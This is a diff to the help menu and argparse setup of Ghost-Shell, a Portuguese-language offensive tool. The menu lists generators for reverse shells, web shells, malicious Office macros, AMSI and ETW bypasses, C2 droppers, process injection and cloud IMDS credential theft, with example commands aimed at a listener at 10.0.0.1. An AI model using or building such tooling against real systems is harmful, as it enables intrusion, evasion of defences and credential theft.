@@ -1831,14 +1831,52 @@ i686-w64-mingw32-gcc -shared -o {nome_dll} dll_hijack.c -lws2_32{X}
 # CLI
 # ==============================================================================
 
+_SHELL_HELP = """\033[92mComandos disponiveis:\033[0m
+  \033[1mgen\033[0m                Gerar payload de reverse shell (bash/python3/php/perl/ruby/ps1/nc...)
+  \033[1mwebshell\033[0m           Gerar web shells (PHP/JSP/ASPX/Python/Perl)
+  \033[1mencode\033[0m             Codificar payload (base64/hex/url/double_url/base64_utf16)
+  \033[1mamsi-bypass\033[0m        Gerar bypass de AMSI para PowerShell
+  \033[1mxor-shell\033[0m          Payload XOR cifrado com chave customizavel
+  \033[1mobfuscate\033[0m          Ofuscar payload (varnames/concat/split)
+  \033[1mc2\033[0m                 Gerar agente C2 simples (HTTP polling)
+  \033[1mlisten\033[0m             Iniciar listener multi-conexao (nc-like)
+  \033[1mmacro\033[0m              Gerar macro Office maliciosa (VBA/XLM/HTA)
+  \033[1mshellcode\033[0m          Runner de shellcode XOR-cifrado (Python/C)
+  \033[1mstaged-loader\033[0m      Staged payload: stager HTTP + stage em memoria
+  \033[1mc2-dropper\033[0m         Dropper para Sliver ou Havoc C2
+  \033[1metw-bypass\033[0m         Bypass de ETW (Event Tracing for Windows)
+  \033[1mlolbas\033[0m             Living-off-the-land: exec/download/UAC bypass via binarios Windows
+  \033[1mprocess-inject\033[0m     Template de injecao de processo (Python/C)
+  \033[1mimds-steal\033[0m         Roubo de credenciais via IMDS (AWS/GCP/Azure)
+  \033[1mdll-hijack\033[0m         Template de DLL hijacking para Windows
+
+\033[92mLinguagens para gen:\033[0m
+  bash  python3  php  perl  ruby  powershell  nc  socat  nodejs  java  golang  groovy  lua  awk  all
+
+\033[92mExemplos:\033[0m
+  python ghost-shell.py gen -l bash -i 10.0.0.1 -p 4444
+  python ghost-shell.py gen -l all -i 10.0.0.1 -p 4444
+  python ghost-shell.py gen -l python3 -i 10.0.0.1 -p 4444 --estabilizar --listener
+  python ghost-shell.py webshell --tipo php --senha s3cr3t
+  python ghost-shell.py encode --payload "cmd.exe /c whoami" --tipo base64
+  python ghost-shell.py xor-shell -i 10.0.0.1 -p 4444 -l python3
+  python ghost-shell.py listen -p 4444 --max 5
+  python ghost-shell.py macro --tipo vba -i 10.0.0.1 -p 4444
+  python ghost-shell.py lolbas --objetivo exec
+
+\033[2mUse: python ghost-shell.py <comando> --help  para opcoes de cada comando\033[0m
+"""
+
+
 def main():
     parser = argparse.ArgumentParser(
         prog="ghost-shell",
-        description="Ghost-Shell v{} - Reverse Shell & Web Shell Generator | By Gh0st-Bx1".format(VERSAO),
-        formatter_class=argparse.RawTextHelpFormatter,
+        description="Ghost-Shell v{} - Reverse Shell & Web Shell Generator  |  By Gh0st-Bx1".format(VERSAO),
+        epilog=_SHELL_HELP,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
     )
 
-    sub = parser.add_subparsers(dest="modo")
+    sub = parser.add_subparsers(dest="modo", title=argparse.SUPPRESS, metavar="comando")
 
     # Modo GEN
     p_gen = sub.add_parser("gen", help="Gerar payload de reverse shell")
